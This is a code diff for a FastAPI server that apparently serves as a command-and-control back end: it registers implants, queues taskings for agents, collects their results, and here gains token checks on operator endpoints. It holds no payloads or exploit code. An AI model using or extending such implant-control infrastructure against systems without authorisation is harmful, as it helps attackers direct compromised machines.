@@ -38,6 +38,7 @@ def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestFo
     return {"access_token": access_token, "token_type": "bearer"}
 
 
+# for clients only to get jwt token upon successful login 
 def create_access_token(data: dict, expires_delta: timedelta | None = None):
     to_encode = data.copy()
     expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
@@ -46,6 +47,7 @@ def create_access_token(data: dict, expires_delta: timedelta | None = None):
     return encoded_jwt
 
 
+# for clients only to verify the token is correct and valid still
 def verify_token(token: str, Depends=(oauth2_scheme)):
     credentials_exception = HTTPException(
             status_code = status.HTTP_401_UNAUTHORIZED,
@@ -65,6 +67,7 @@ def verify_token(token: str, Depends=(oauth2_scheme)):
 # PROTECTED endpoint to view all information about all users
 @app.get("/users", response_model=List[UserRead])
 def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     users = db.query(Users).all()
     return users
 
@@ -72,6 +75,7 @@ def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_
 # PROTECTED endpoint to view all information about a user
 @app.get("/users/{user_id}", response_model=UserRead)
 def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     user = db.query(Users).filter(Users.id == user_id).first()
     if user is None:
         raise HTTPException(status_code=404, detail="User not found")
@@ -81,6 +85,7 @@ def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Sec
 # PROTECTED endpoint to create a new user
 @app.post("/users/create", response_model=UserCreate)
 def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     existing_user = db.query(Users).filter(Users.username == user.username).first()
     if existing_user:
         raise HTTPException(status_code=400, detail="Username already exists")
@@ -95,6 +100,7 @@ def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str
 # PROTECTED endpoint to delete a user
 @app.delete("/users/delete/{user_id}", response_model=UserDelete)
 def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     db_user = db.query(Users).filter(Users.id == user_id).first()
     if db_user is None:
         raise HTTPException(status_code=404, detail="User not found")
@@ -102,6 +108,18 @@ def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = S
     db.commit()
     return UserDelete(id=user_id)
 
+
+# PROTECTED endpoint for clients to retrieve result based on session id and tasking id
+@app.get("/results/{session}/{id}", response_model=ResultsRead)
+def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
+    db_implant = db.query(Implant).filter(Implant.session == session).first()
+    if not db_implant:
+        raise HTTPException(status_code=404, detail="Session not found")
+    db_result = db.query(Results).filter(Results.session == session, Results.id == id).first()
+    if db_result is None:
+        raise HTTPException(status_code=416, detail="Result out of range")
+    return db_result
 
 
 # recieve tasking output from agent based on session id, marks task complete = True
@@ -142,6 +160,7 @@ def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depe
 # PROTECTED endpoint in order to create a task for an implant (client -> server)
 @app.post("/tasking/{session}", response_model=TaskingCreate)
 def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
+    verify_token(token)
     current_time = datetime.now(timezone.utc).isoformat()
     # Check if the session exists
     db_implant = db.query(Implant).filter(Implant.session == session).first()
@@ -169,9 +188,10 @@ def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depe
     return db_task
 
 
-# endpoint for agent to retrieve taskings 
+# PROTECTED endpoint for client to retrieve taskings 
 @app.get("/tasking/{session}", response_model=List[TaskingRead])
-def read_taskings(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
+def read_taskings(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -198,12 +218,15 @@ def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): 
 # PROTECTED endpoint for clients only to be able to view all implants
 @app.get("/implants/", response_model=List[ImplantRead])
 def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     implants = db.query(Implant).all()
     return implants
 
-# PROTECTED endpoint for client only to be able to view a single implant by session
+
+# PROTECTED endpoint for clients to be able to view a single implant by session
 @app.get("/implants/{session}", response_model=ImplantRead)
 def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     implant = db.query(Implant).filter(Implant.session == session).first()
     if implant is None:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -214,6 +237,7 @@ def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token:
 # PROTECTED endpoint allowing client to delete stale/killed implants
 @app.delete("/implants/delete/{session}", response_model=ImplantDelete)
 def delete_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    verify_token(token)
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if db_implant is None:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -242,6 +266,8 @@ def check_in(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
     # no pending tasks all completed=True
     return db_implant
 
+
+# endpoint for agent to retrieve tasks, mark them as pending after agent picks them up
 @app.get("/tasks/{session}", response_model=List[TaskingRead])
 def get_tasks(session: str, db: SessionLocal = Depends(get_db)):    # type: ignore
     db_implant = db.query(Implant).filter(Implant.session == session).first()
